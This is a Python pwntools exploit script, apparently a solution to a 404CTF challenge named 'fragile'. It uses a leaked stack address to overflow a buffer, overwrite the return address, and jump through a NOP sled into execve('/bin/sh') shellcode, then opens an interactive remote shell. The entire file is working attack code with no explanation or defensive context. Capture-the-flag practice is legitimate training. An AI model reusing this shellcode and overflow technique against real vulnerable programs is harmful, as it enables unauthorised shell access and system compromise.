import struct
import binascii
from pwn import *

pad = b"\x61" * 72
host = 'challenge.404ctf.fr'
port = 31720

#connection = process("./fragile", stdin=PIPE, stdout=PIPE)
connection = remote(host,port)
print(connection.recvline())
var_addr = int(connection.recvline()[9:23].decode("utf-8"),0)
print(hex(var_addr))
rip_addr = var_addr + 72 + 12
rip = struct.pack("L", rip_addr)
print(rip)
shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
nop = b"\x90" * 64
payload = pad + rip + nop + shellcode + nop 
connection.send(payload)
connection.interactive()


